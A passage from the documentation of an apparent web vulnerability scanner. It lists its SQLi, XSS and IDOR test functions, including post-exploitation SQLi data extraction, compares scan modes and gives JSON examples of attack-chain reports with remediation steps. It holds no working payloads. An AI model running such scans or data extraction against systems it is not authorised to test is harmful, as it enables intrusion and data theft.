| `scanner/scanner_tools/nuclei.py:1236` | `staged_nuclei_scan()` with 4-wave strategy |
| `scanner/scanner_tools/active_checks.py:2507` | `smart_sqli_test()` - DBMS-aware SQLi |
| `scanner/scanner_tools/active_checks.py:2946` | `smart_xss_test()` - Context-aware XSS |
| `scanner/scanner_tools/active_checks.py:2963` | `sqli_data_extraction()` - Post-exploitation |
| `scanner/scanner_tools/active_checks.py:3125` | `oob_sqli_test()` - Out-of-band SQLi |
| `scanner/scanner_tools/active_checks.py:3295` | `dom_xss_analysis()` - DOM XSS detection |
| `scanner/scanner_tools/access_control_checks.py:1145` | `smart_bola_test()` - IDOR/BOLA testing |
| `api/worker.py` | Worker entry point for smart scans |

---

## Comparison: Default vs Thorough Mode

| Aspect | Default Smart Scan | Thorough Smart Scan |
|--------|-------------------|---------------------|
| Early stopping | After 3 critical / 5 high | Disabled |
| SQLi endpoints | 50 per method | 100 per method |
| SQLi params | 5 per endpoint | 10 per endpoint |
| XSS endpoints | 50 per method | 100 per method |
| XSS params | 5 per endpoint | 10 per endpoint |
| Typical duration | 15-40 min | 30-60+ min |
| Use case | Quick assessment | Comprehensive pentest |
| Findings | First occurrences | All occurrences |

---

## Attack Chain Analysis

Smart scans correlate findings into attack chains - multi-step vulnerability combinations that demonstrate real-world attack scenarios.

### Chain Types

| Chain Type | Required Findings | Business Impact |
|------------|-------------------|-----------------|
| `xss_to_account_takeover` | XSS + insecure cookies | Session theft, account compromise |
| `sqli_to_privilege_escalation` | SQLi + admin panel | Database compromise, admin access |
| `ssrf_to_cloud_breach` | SSRF + cloud metadata | Cloud IAM credential theft |
| `idor_to_data_breach` | BOLA + predictable IDs | Mass user data exfiltration |
| `lfi_to_credential_theft` | LFI + sensitive files | Credential file exposure |
| `auth_bypass_to_admin_access` | Auth bypass + admin | Unauthorized admin access |
| `cors_to_data_theft` | CORS misconfig + sensitive data | Cross-origin data theft |
| `weak_jwt_to_impersonation` | JWT weakness + user endpoints | User impersonation |
| `open_redirect_to_phishing` | Open redirect + auth pages | Credential phishing |
| `info_disclosure_to_exploitation` | Info leak + known CVE | Targeted exploitation |

### JSON Output Structure

**Complete Chain Example:**
```json
{
  "chain_type": "xss_to_account_takeover",
  "name": "XSS to Account Takeover",
  "severity": "critical",
  "confidence": 0.85,
  "completeness": 1.0,
  "steps": [
    {
      "step_number": 1,
      "finding_type": "xss",
      "description": "Attacker injects malicious JavaScript via reflected XSS",
      "finding_id": "finding-uuid-1"
    },
    {
      "step_number": 2,
      "finding_type": "insecure_cookie",
      "description": "Session cookie lacks HttpOnly flag, accessible to JavaScript",
      "finding_id": "finding-uuid-2"
    },
    {
      "step_number": 3,
      "finding_type": "session_theft",
      "description": "Attacker exfiltrates session token and hijacks account"
    }
  ],
  "remediation": [
    "Add HttpOnly flag to all session cookies",
    "Implement Content Security Policy to prevent XSS",
    "Add SameSite=Strict to cookies"
  ]
}
```

**Partial Chain Example:**
```json
{
  "chain_type": "ssrf_to_cloud_breach",
  "name": "SSRF to Cloud Breach",
  "severity": "high",           // Downgraded from critical
  "confidence": 0.60,
  "completeness": 0.67,         // 2 of 3 required findings
  "missing_required": ["cloud_metadata_access"],
  "missing_optional": ["iam_role_assumption"],
  "steps": [
    {
      "step_number": 1,
      "finding_type": "ssrf",
      "description": "Server-side request forgery allows internal requests",
      "finding_id": "finding-uuid-3"
    },
    {
      "step_number": 2,
      "finding_type": "cloud_metadata_access",
      "description": "MISSING: Access to cloud metadata service (169.254.169.254)"
    }
  ],
  "remediation": [
    "Block requests to internal IP ranges",
    "Use allowlists for outbound requests",
    "Implement IMDSv2 for AWS instances"
  ]
}
```

### Full Result Structure

```json
{
  "attack_chains": {
    "chains": [...],           // Complete chains (always populated)
    "partial_chains": [...],   // Incomplete chains (always in JSON)
    "report": "...",           // Human-readable text report
    "summary": {
      "total_chains": 2,
      "total_partial_chains": 3,
      "critical_chains": 1,
      "high_chains": 1,
      "chain_types": ["xss_to_account_takeover", "sqli_to_privilege_escalation"],
      "partial_chain_types": ["ssrf_to_cloud_breach", "idor_to_data_breach"],
      "partial_chains_included": false  // In human report only if option set
    }
  }
}
```

### Enabling Partial Chains in Reports

By default, only complete chains appear in the human-readable report. For analyst mode:

```bash
curl -X POST http://localhost:8080/scans \
  -H "Content-Type: application/json" \
  -d '{
    "target": "https://example.com",
    "options": {
      "scan_type": "smart",
      "include_partial_attack_chains": true
    }
  }'
```

**Note**: Partial chains are always available in `result.attack_chains.partial_chains` regardless of this option. The option only controls whether they appear in the human-readable `report` field.
